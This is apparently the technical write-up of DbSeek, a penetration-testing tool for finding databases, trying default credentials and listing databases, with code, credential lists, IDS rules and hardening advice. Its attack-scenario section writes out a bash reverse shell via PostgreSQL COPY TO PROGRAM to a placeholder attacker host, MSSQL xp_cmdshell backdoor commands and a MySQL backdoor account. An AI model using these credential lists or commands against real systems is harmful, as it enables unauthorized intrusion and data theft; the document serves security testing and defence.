# DbSeek Technical Summary

## Overview
DbSeek is a multi-database discovery and authentication testing tool designed for internal network penetration testing. It performs port scanning, service identification, banner grabbing, default credential validation, and safe database enumeration across 10+ database platforms. The tool integrates with credential harvesting techniques (Responder/LLMNR poisoning) to enable immediate credential validation across entire networks.

Unlike general-purpose scanners, DbSeek combines discovery with authentication testing and read-only enumeration in a single workflow, optimized for database-specific reconnaissance.

## Architecture

### Core Components
1. **Port Scanner**: TCP connection testing for database services
2. **Banner Grabber**: Version detection (MySQL handshake, HTTP APIs)
3. **Authentication Tester**: Credential validation with Python DB libraries + CLI fallback
4. **Database Enumerator**: Safe, read-only database listing (SHOW DATABASES, pg_database, etc.)
5. **Credential Manager**: Default credential dictionaries + custom credential support
6. **Concurrency Engine**: Multi-threaded scanning with ThreadPoolExecutor
7. **Report Generator**: Multiple output formats (TXT, JSON, credential lists)

### Scanning Flow
```
IP List → Port Scan → Service Detection → Version Detection → Credential Testing → Database Enumeration → Reporting
         (3306,5432   (MySQL/Postgres/    (Banner grab)     (Default + custom)  (SHOW DATABASES)   (dblist.txt
          1433,etc)    MSSQL/MongoDB)                                                             +db_creds.txt
                                                                                                   +db_details.json)
```

## Implementation Details

### Port Detection
```python
def check_port(ip: str, port: int, timeout: int = 2) -> bool:
    """
    TCP connection test for database ports
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False
```

**Ports Scanned**:
```python
DB_PORTS = {
    3306: 'MySQL/MariaDB',
    5432: 'PostgreSQL',
    1433: 'MSSQL',
    27017: 'MongoDB',
    6379: 'Redis',
    1521: 'Oracle',
    1522: 'Oracle-Alt',
    9200: 'Elasticsearch-HTTP',
    9300: 'Elasticsearch-Transport',
    9042: 'Cassandra',
    5984: 'CouchDB',
    7000: 'Cassandra-Cluster',
    7001: 'Cassandra-SSL'
}
```

### MySQL Banner Grabbing

**Protocol**: MySQL client-server handshake
```python
def get_mysql_banner(ip: str, port: int = 3306, timeout: int = 5) -> Optional[str]:
    """
    Parse MySQL initial handshake packet for version
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        # Receive initial handshake packet
        # Format: [packet_length:3][packet_number:1][protocol_version:1][version_string:null-terminated]
        data = sock.recv(1024)
        
        if len(data) > 5:
            # Skip: packet_length(3) + packet_number(1) + protocol_version(1) = 5 bytes
            # Version string is null-terminated
            version = data[5:].split(b'\x00')[0].decode('utf-8', errors='ignore')
            sock.close()
            return version
        
        sock.close()
    except:
        pass
    
    return None
```

**Example Packet**:
```
Packet Length: 4A 00 00    (74 bytes)
Packet Number: 00           (packet 0)
Protocol Ver:  0A           (protocol 10)
Version:       35 2E 37 2E 33 33 2D 6C 6F 67 00  ("5.7.33-log\0")
...
```

**Version Strings**:
- `5.7.33-log`: MySQL 5.7.33 with logging enabled
- `10.5.12-MariaDB`: MariaDB 10.5.12
- `8.0.26`: MySQL 8.0.26

### MySQL Authentication Testing

**Dual Method Approach**: Python library (preferred) + CLI fallback

**Method 1: pymysql Library**
```python
def test_mysql_access(ip: str, port: int = 3306, username: str = 'root', 
                     password: str = '', timeout: int = 10) -> Tuple[bool, Optional[str]]:
    try:
        import pymysql
        
        conn = pymysql.connect(
            host=ip,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        
        cursor = conn.cursor()
        cursor.execute("SELECT VERSION()")
        version = cursor.fetchone()[0]
        
        conn.close()
        return True, version
        
    except ImportError:
        # Fall back to mysql CLI
        ...
```

**Method 2: mysql CLI (Fallback)**
```python
# Blank password
cmd = f"mysql -h {ip} -P {port} -u {username} -e 'SELECT VERSION();' 2>&1"

# With password
cmd = f"mysql -h {ip} -P {port} -u {username} -p{password} -e 'SELECT VERSION();' 2>&1"

result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)

if result.returncode == 0 and 'VERSION()' in result.stdout:
    return True, 'Connected'
```

**Why Dual Method?**:
- **Python library**: Faster, more reliable, programmatic error handling
- **CLI fallback**: Works when pymysql not installed, uses system mysql client
- **Trade-off**: CLI requires mysql-client package, Python library requires pip install

**Default Credentials**:
```python
DEFAULT_CREDS['MySQL'] = [
    ('root', ''),           # Most common vulnerability
    ('root', 'root'),       # Default on some distributions
    ('root', 'password'),   # Weak password
    ('root', 'toor'),       # Reverse of 'root'
    ('admin', 'admin'),     # Alternative admin account
    ('mysql', 'mysql')      # MySQL service account
]
```

### PostgreSQL Authentication Testing

**Challenge**: PostgreSQL uses multiple authentication methods (trust, md5, scram-sha-256)

```python
def test_postgresql_access(ip: str, port: int = 5432, username: str = 'postgres', 
                          password: str = '', timeout: int = 10) -> Tuple[bool, Optional[str]]:
    try:
        import psycopg2
        
        # psycopg2 handles authentication method negotiation
        conn = psycopg2.connect(
            host=ip,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        
        cursor = conn.cursor()
        cursor.execute("SELECT version()")
        version = cursor.fetchone()[0]
        
        conn.close()
        return True, version
        
    except ImportError:
        # CLI fallback with PGPASSWORD environment variable
        env = os.environ.copy()
        if password:
            env['PGPASSWORD'] = password
            cmd = ['psql', '-h', ip, '-p', str(port), '-U', username, '-c', 'SELECT version();']
        else:
            cmd = ['psql', '-h', ip, '-p', str(port), '-U', username, '-w', '-c', 'SELECT version();']
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
        
        if result.returncode == 0 and 'PostgreSQL' in result.stdout:
            return True, 'Connected'
```

**pg_hba.conf Authentication Methods**:
- **trust**: No password required (extremely vulnerable)
- **md5**: MD5-hashed password
- **scram-sha-256**: Modern secure method
- **peer**: Unix socket authentication (local only)

**Default Credentials**:
```python
DEFAULT_CREDS['PostgreSQL'] = [
    ('postgres', ''),       # Blank password (trust authentication)
    ('postgres', 'postgres'),  # Default password
    ('postgres', 'password'),  # Weak password
    ('admin', 'admin')      # Alternative account
]
```

### MSSQL Authentication Testing

**Challenge**: MSSQL uses TDS (Tabular Data Stream) protocol, requires pymssql or similar

```python
def test_mssql_access(ip: str, port: int = 1433, username: str = 'sa', 
                     password: str = '', timeout: int = 10) -> Tuple[bool, Optional[str]]:
    try:
        import pymssql
        
        conn = pymssql.connect(
            server=ip,
            port=port,
            user=username,
            password=password,
            timeout=timeout
        )
        
        cursor = conn.cursor()
        cursor.execute("SELECT @@VERSION")
        version = cursor.fetchone()[0]
        
        conn.close()
        return True, version
        
    except ImportError:
        # No CLI fallback - pymssql required
        return False, 'pymssql not installed'
    
    except Exception as e:
        return False, str(e)
```

**Why No CLI Fallback?**:
- SQL Server CLI (sqlcmd, mssql-cli) not typically installed on Linux penetration testing systems
- Cross-platform complexity (Windows sqlcmd vs. Linux alternatives)
- pymssql library provides sufficient functionality

**Default Credentials**:
```python
DEFAULT_CREDS['MSSQL'] = [
    ('sa', ''),             # System Administrator with blank password
    ('sa', 'sa'),           # SA password = sa
    ('sa', 'password'),     # Weak password
    ('sa', 'Password123'),  # Common pattern (uppercase P)
    ('admin', 'admin')      # Alternative admin account
]
```

### MongoDB Authentication Testing

**Key Behavior**: Test for **no authentication first** (most common vulnerability)

```python
def test_mongodb_access(ip: str, port: int = 27017, username: str = '', 
                       password: str = '', timeout: int = 10) -> Tuple[bool, Optional[str]]:
    try:
        import pymongo
        
        if username and password:
            client = pymongo.MongoClient(
                ip,
                port,
                username=username,
                password=password,
                serverSelectionTimeoutMS=timeout * 1000
            )
        else:
            # Test no authentication
            client = pymongo.MongoClient(
                ip,
                port,
                serverSelectionTimeoutMS=timeout * 1000
            )
        
        # Try to get server info (triggers authentication check)
        info = client.server_info()
        version = info.get('version', 'Unknown')
        
        client.close()
        return True, version
```

**Authentication Flow**:
1. **Test no auth**: `MongoClient(ip, port)` (most common)
2. **If auth required**: Test default credentials
3. **If custom creds**: Test user-provided credentials

**Default Credentials**:
```python
DEFAULT_CREDS['MongoDB'] = [
    ('admin', ''),          # Admin with blank password
    ('root', ''),           # Root with blank password
    ('admin', 'admin'),     # Admin:admin
    ('root', 'root')        # Root:root
]
```

**Common MongoDB Vulnerabilities**:
- No `--auth` flag = **no authentication required**
- Default admin account with blank password
- Exposed to network without `--bind_ip 127.0.0.1`

### Redis Authentication Testing

**Key Behavior**: Redis uses **password-only authentication** (no username)

```python
def test_redis_access(ip: str, port: int = 6379, password: str = '', 
                     timeout: int = 10) -> Tuple[bool, Optional[str]]:
    try:
        import redis
        
        if password:
            r = redis.Redis(host=ip, port=port, password=password, 
                          socket_connect_timeout=timeout, decode_responses=True)
        else:
            # Test no authentication
            r = redis.Redis(host=ip, port=port, socket_connect_timeout=timeout, 
                          decode_responses=True)
        
        # INFO command requires authentication if configured
        info = r.info()
        version = info.get('redis_version', 'Unknown')
        
        return True, version
```

**Authentication Flow**:
1. **Test no auth**: `Redis(host, port)` without password
2. **If NOAUTH error**: Test default passwords

**Redis AUTH Command**:
```
AUTH password
```

**Default Passwords**:
```python
DEFAULT_CREDS['Redis'] = [
    ('', ''),       # No authentication (tested first)
    ('', 'redis'),  # Password = 'redis'
    ('', 'password') # Password = 'password'
]
```

**Redis Vulnerabilities**:
- No `requirepass` directive = **no authentication**
- Weak `requirepass` password
- Dangerous commands not disabled (CONFIG, FLUSHALL, EVAL)
- Can be exploited for SSH key injection, cron job injection, web shell upload

### Elasticsearch No-Auth Detection

**Elasticsearch HTTP API**: Port 9200 exposes JSON API

```python
def check_elasticsearch(ip: str, port: int = 9200, timeout: int = 10) -> Dict:
    result = {
        'accessible': False,
        'version': None,
        'cluster_name': None,
        'no_auth': False,
        'error': None
    }
    
    try:
        import http.client
        
        conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request('GET', '/')
        response = conn.getresponse()
        
        if response.status == 200:
            data = json.loads(response.read().decode())
            result['accessible'] = True
            result['no_auth'] = True  # If GET / succeeds, no auth required
            result['version'] = data.get('version', {}).get('number')
            result['cluster_name'] = data.get('cluster_name')
        
        conn.close()
        
    except Exception as e:
        result['error'] = str(e)
    
    return result
```

**Example Response**:
```json
{
  "name": "elastic-node-1",
  "cluster_name": "production-cluster",
  "cluster_uuid": "abc123...",
  "version": {
    "number": "7.15.0",
    "build_flavor": "default"
  },
  "tagline": "You Know, for Search"
}
```

**Security Implications**:
- HTTP 200 on `GET /` = **no authentication required**
- Can query `GET /_cat/indices` to list all indices
- Can query `GET /index_name/_search` to extract data
- Directory traversal vulnerabilities in older versions

### Database Enumeration (Safe, Read-Only)

**Critical Design Principle**: All enumeration queries are **read-only** and **non-destructive**

#### MySQL Enumeration
```python
def enumerate_mysql_databases(ip: str, port: int, username: str, password: str, 
                              timeout: int = 10) -> List[str]:
    """
    SAFE: List databases in MySQL (READ-ONLY operation)
    Returns list of database names
    """
    databases = []
    try:
        import pymysql
        
        conn = pymysql.connect(
            host=ip,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        
        cursor = conn.cursor()
        # SAFE: SHOW DATABASES is read-only
        cursor.execute("SHOW DATABASES")
        databases = [row[0] for row in cursor.fetchall()]
        
        conn.close()
    except:
        pass
    
    return databases
```

**SQL Query**: `SHOW DATABASES`

**Returns**:
```
mysql
information_schema
performance_schema
app_database
customer_data
payroll
```

**System Databases** (always present):
- `mysql`: User accounts and privileges
- `information_schema`: Metadata about databases/tables
- `performance_schema`: Performance monitoring

#### PostgreSQL Enumeration
```python
def enumerate_postgresql_databases(ip: str, port: int, username: str, password: str, 
                                   timeout: int = 10) -> List[str]:
    """
    SAFE: List databases in PostgreSQL (READ-ONLY operation)
    """
    databases = []
    try:
        import psycopg2
        
        conn = psycopg2.connect(
            host=ip,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        
        cursor = conn.cursor()
        # SAFE: Query system catalog (read-only)
        cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
        databases = [row[0] for row in cursor.fetchall()]
        
        conn.close()
    except:
        pass
    
    return databases
```

**SQL Query**: `SELECT datname FROM pg_database WHERE datistemplate = false`

**Returns**:
```
postgres
employee_db
financial_records
application_data
```

**System Databases** (excluded):
- `template0`: Pristine template
- `template1`: Default template

#### MSSQL Enumeration
```python
def enumerate_mssql_databases(ip: str, port: int, username: str, password: str, 
                              timeout: int = 10) -> List[str]:
    """
    SAFE: List databases in MSSQL (READ-ONLY operation)
    """
    databases = []
    try:
        import pymssql
        
        conn = pymssql.connect(
            server=ip,
            port=port,
            user=username,
            password=password,
            timeout=timeout
        )
        
        cursor = conn.cursor()
        # SAFE: Query system view (read-only)
        cursor.execute("SELECT name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')")
        databases = [row[0] for row in cursor.fetchall()]
        
        conn.close()
    except:
        pass
    
    return databases
```

**SQL Query**: `SELECT name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')`

**Returns**:
```
hr_database
payroll
inventory
customer_orders
```

**System Databases** (excluded):
- `master`: System configuration
- `tempdb`: Temporary objects
- `model`: Template for new databases
- `msdb`: SQL Server Agent

#### MongoDB Enumeration
```python
def enumerate_mongodb_databases(ip: str, port: int, username: str, password: str, 
                                timeout: int = 10) -> List[str]:
    """
    SAFE: List databases in MongoDB (READ-ONLY operation)
    """
    databases = []
    try:
        import pymongo
        
        if username and password:
            client = pymongo.MongoClient(
                ip, 
                port, 
                username=username, 
                password=password,
                serverSelectionTimeoutMS=timeout * 1000
            )
        else:
            client = pymongo.MongoClient(ip, port, serverSelectionTimeoutMS=timeout * 1000)
        
        # SAFE: List databases (read-only)
        databases = client.list_database_names()
        
        client.close()
    except:
        pass
    
    return databases
```

**MongoDB Command**: `client.list_database_names()`

**Returns**:
```
admin
config
local
app_database
user_data
analytics
```

**System Databases**:
- `admin`: Administrative database
- `config`: Sharding configuration
- `local`: Local server data

### Responder Integration

**Workflow**: Capture credentials via LLMNR/NBT-NS poisoning → Test immediately with DbSeek

**Responder Credential Capture**:
```
[MSSQL] NTLMv2-SSP Hash Captured
User: DOMAIN\sqlservice
Hash: sqlservice::DOMAIN:1122334455667788:ABC123...
```

**Hash Cracking** (if needed):
```bash
hashcat -m 5600 hash.txt rockyou.txt
# Result: sqlservice:SQLService2023!
```

**DbSeek Testing**:
```bash
./dbseek.py -u sqlservice -p SQLService2023! -v -e
```

**Implementation**:
```python
def scan_host(ip: str, timeout: int = 2, test_creds: bool = False, 
              custom_username: Optional[str] = None, custom_password: Optional[str] = None,
              enumerate_dbs: bool = False) -> Dict:
    """
    Args:
        custom_username: Custom username to test (e.g., from Responder)
        custom_password: Custom password to test (e.g., from Responder)
    """
    
    # Try custom credentials FIRST (before defaults)
    if custom_username and custom_password:
        success, info = test_mysql_access(ip, port, custom_username, custom_password, timeout)
        if success:
            service_info['default_creds_work'] = True
            service_info['working_creds'] = {'username': custom_username, 'password': custom_password}
            result['default_creds'].append({
                'service': 'MySQL',
                'username': custom_username,
                'password': custom_password,
                'source': 'custom'  # Mark as custom credential
            })
            result['vulnerable'].append(f"MySQL custom credentials work: {custom_username}/{custom_password}")
```

**Why Custom Creds First?**:
- More likely to succeed (targeted credential)
- Saves time (avoid testing all default credentials)
- Credential reuse is common across services

### Concurrent Execution

**Threading Model**: ThreadPoolExecutor for parallel host scanning

```python
with ThreadPoolExecutor(max_workers=10) as executor:
    future_to_ip = {
        executor.submit(scan_host, ip, timeout, test_creds, 
                       custom_username, custom_password, enumerate_dbs): ip 
        for ip in ips
    }
    
    for future in as_completed(future_to_ip):
        ip = future_to_ip[future]
        result = future.result()
        results.append(result)
```

**Performance Characteristics**:
- **I/O Bound**: Network connections and subprocess calls
- **GIL Impact**: Minimal (threads block on I/O, release GIL)
- **Optimal Workers**: 10-50 depending on network latency

**Per-Host Timing** (worst case):
- Port checks (13 ports × 2s timeout): ~26 seconds
- If port open:
  - Banner grab: 2-5 seconds
  - Credential test (6 credentials × 10s timeout): up to 60 seconds
  - Database enumeration: 5-10 seconds
- **Total worst case**: ~90 seconds per host with all services

**Network Scan Times**:
| Network | Workers | Time (Discovery) | Time (Full Scan -t -e) |
|---------|---------|------------------|------------------------|
| /24 (254) | 10 | 5-10 min | 30-60 min |
| /24 (254) | 50 | 1-3 min | 10-20 min |
| /16 (65K) | 10 | 20-40 hours | 100-200 hours |
| /16 (65K) | 50 | 4-8 hours | 20-40 hours |

## Output Formats

### JSON Structure
```json
{
  "ip": "192.168.1.50",
  "hostname": "mysql-prod-01.company.local",
  "databases_found": true,
  "services": {
    "MySQL/MariaDB": {
      "port": 3306,
      "accessible": true,
      "version": "5.7.33-log",
      "auth_required": false,
      "default_creds_work": true,
      "working_creds": {
        "username": "root",
        "password": ""
      },
      "databases": [
        "mysql",
        "information_schema",
        "performance_schema",
        "app_database",
        "customer_data"
      ]
    }
  },
  "vulnerable": [
    "MySQL weak credentials: root/(blank)"
  ],
  "default_creds": [
    {
      "service": "MySQL",
      "username": "root",
      "password": "",
      "source": "default"
    }
  ],
  "error": null
}
```

## Security Implications

### Common Misconfigurations

**1. Blank Database Passwords**
- **MySQL**: `root` with no password (extremely common in dev environments)
- **PostgreSQL**: `trust` authentication in pg_hba.conf
- **MSSQL**: `sa` with blank password
- **Impact**: Complete database access

**2. No Authentication Required**
- **MongoDB**: No `--auth` flag
- **Redis**: No `requirepass` directive
- **Elasticsearch**: No X-Pack security
- **Impact**: Public access to all data

**3. Weak Passwords**
- Passwords matching usernames (`root:root`, `postgres:postgres`)
- Simple passwords (`password`, `Password123`)
- Default passwords not changed (`sys:sys`, `scott:tiger`)
- **Impact**: Easy brute force

**4. Network Exposure**
- Databases listening on `0.0.0.0` (all interfaces)
- No firewall restrictions
- Accessible from untrusted networks
- **Impact**: External attack surface

### Attack Scenarios

**Scenario 1: MongoDB No Auth → Data Exfiltration**
```
1. DbSeek discovers: MongoDB 192.168.1.52, no auth required
2. Enumeration reveals databases: admin, config, user_db, financial_db
3. Connection: mongo --host 192.168.1.52
4. Extraction:
   use financial_db
   db.transactions.find()
   db.accounts.find()
5. Impact: Complete financial data breach
```

**Scenario 2: MySQL Blank Root → Backdoor Creation**
```
1. DbSeek discovers: MySQL 192.168.1.50, root:(blank)
2. Connection: mysql -h 192.168.1.50 -u root
3. Backdoor creation:
   CREATE USER 'backdoor'@'%' IDENTIFIED BY 'SecretPass123';
   GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
4. Persistence: Backdoor account for future access
5. Impact: Long-term database compromise
```

**Scenario 3: PostgreSQL Trust Auth → Command Execution**
```
1. DbSeek discovers: PostgreSQL 192.168.1.51, postgres:(blank)
2. Connection: psql -h 192.168.1.51 -U postgres
3. OS command execution:
   COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
4. Reverse shell:
   COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
5. Impact: Database server compromise + OS access
```

**Scenario 4: MSSQL SA Account → xp_cmdshell**
```
1. DbSeek discovers: MSSQL 192.168.1.53, sa:Password123
2. Connection: sqlcmd -S 192.168.1.53 -U sa -P Password123
3. Enable xp_cmdshell:
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
4. Command execution:
   EXEC xp_cmdshell 'whoami';
   EXEC xp_cmdshell 'net user backdoor Pass123! /add';
5. Impact: Windows server compromise
```

## Detection & Defense

### Network Detection

**IDS Signatures**:
```snort
# Sequential database port scanning
alert tcp $EXTERNAL_NET any -> $HOME_NET [3306,5432,1433,27017,6379] (
    msg:"Database port scanning from single source";
    flags:S;
    threshold:type threshold, track by_src, count 5, seconds 60;
    sid:3000300;
)

# Multiple failed authentication attempts
alert tcp any any -> any 3306 (
    msg:"Multiple MySQL authentication failures";
    content:"Access denied for user";
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000301;
)
```

### Database Hardening Summary

| Database | Key Hardening Steps |
|----------|-------------------|
| MySQL | Set root password, bind to localhost, require SSL |
| PostgreSQL | Use scram-sha-256, update pg_hba.conf, bind to localhost |
| MSSQL | Disable SA, enable Windows auth, disable xp_cmdshell |
| MongoDB | Enable --auth, bind to localhost, create admin user |
| Redis | Set requirepass, bind to localhost, rename dangerous commands |
| Elasticsearch | Enable X-Pack security, require authentication |

## Limitations

### Technical Limitations
- **Oracle/Cassandra**: Port detection only, no credential testing (requires specific libraries)
- **CouchDB**: Port detection only
- **Redis**: No database enumeration (key-value store, not database-oriented)
- **No Kerberos**: Does not support Kerberos authentication
- **No SSL client certs**: Cannot test certificate-based authentication

### Scope Limitations
- **Discovery only**: Does not exploit vulnerabilities
- **No table enumeration**: Database names only, not table/collection names
- **No data extraction**: Does not query or dump data
- **No password cracking**: Tests credentials provided, does not crack hashes

## Performance Optimization

### Pre-Filtering with Nmap
```bash
# Fast port discovery
nmap -p 3306,5432,1433,27017,6379,1521 192.168.1.0/24 --open -oG - | \
    grep "/open/" | cut -d' ' -f2 > db_hosts.txt

# Then targeted DbSeek scan
./dbseek.py -f db_hosts.txt -t -e
```

**Benefit**: Reduces DbSeek target list by 90%+, focusing on confirmed database servers

### Worker Count Tuning
- **Low latency networks** (LAN): 50-100 workers
- **High latency networks** (WAN): 10-20 workers
- **Credential testing**: Lower workers (10-20) to avoid account lockouts
- **Discovery only**: Higher workers (50+) acceptable

## Dependencies

### Python Libraries (Optional but Recommended)
```bash
pip3 install pymysql psycopg2-binary pymssql pymongo redis
```

**Why Optional?**:
- Tool functions without libraries (CLI fallback)
- Libraries provide better error handling and performance
- pymysql/psycopg2 required for enumeration feature

### System Packages (Optional)
```bash
# MySQL client
sudo apt install mysql-client

# PostgreSQL client
sudo apt install postgresql-client

# Redis client
sudo apt install redis-tools

# MongoDB client
sudo apt install mongodb-clients
```

## Future Enhancements
- **Oracle/Cassandra authentication**: Add cx_Oracle and cassandra-driver support
- **Table enumeration**: Extend enumeration to tables/collections
- **Data sampling**: Extract sample rows from sensitive tables
- **Credential brute force**: Integrate dictionary-based password cracking
- **Hash extraction**: Dump password hashes for offline cracking
- **Kerberos support**: Add Kerberos authentication testing
- **Cloud databases**: AWS RDS, Azure SQL, Google Cloud SQL detection
- **Database version vulnerabilities**: Map versions to known CVEs

## References
- **MySQL Protocol**: https://dev.mysql.com/doc/internals/en/client-server-protocol.html
- **PostgreSQL Protocol**: https://www.postgresql.org/docs/current/protocol.html
- **MSSQL TDS Protocol**: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/
- **MongoDB Wire Protocol**: https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/
- **Redis Protocol**: https://redis.io/topics/protocol
- **MITRE ATT&CK**: T1078.001 (Valid Accounts: Default Accounts), T1213 (Data from Information Repositories)
- **CWE-259**: Use of Hard-coded Password
- **CWE-306**: Missing Authentication for Critical Function
- **CWE-521**: Weak Password Requirements

---

**Note**: This tool performs authentication testing which may trigger security alerts and account lockouts. Always operate within authorized scope and follow engagement rules.
